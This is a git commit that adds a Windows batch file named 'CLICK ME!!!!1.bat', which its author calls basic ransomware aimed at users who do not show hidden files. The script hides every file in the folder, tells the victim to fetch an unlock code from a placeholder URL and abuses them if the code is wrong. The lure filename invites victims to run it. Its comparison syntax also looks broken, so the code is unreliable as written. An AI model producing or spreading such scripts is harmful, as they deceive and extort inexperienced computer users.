6948909f526fcd9fe60b3ef5a75303247a3951bf
Rubiktor012 <57574066+Rubiktor012@users.noreply.github.com>
2019-11-29 17:47:58 +0100

    Basic batch ransomware
    It is dedicated to users who are few experienced with PCs and dont have the "show hidden files" activated.

---
+++ CLICK ME!!!!1.bat
@@ -0,0 +1,16 @@
+@echo off
+attrib +h *.*
+echo CODE OR NO FILES!
+echo Get your code here: www.url.com
+set /p code=Enter: 
+if %code%=code (
+    attrib -h *.*
+    echo Thanks!
+    pause
+    exit
+)
+if not %code%=code (
+    echo FUCK U!
+    pause
+    exit
+)
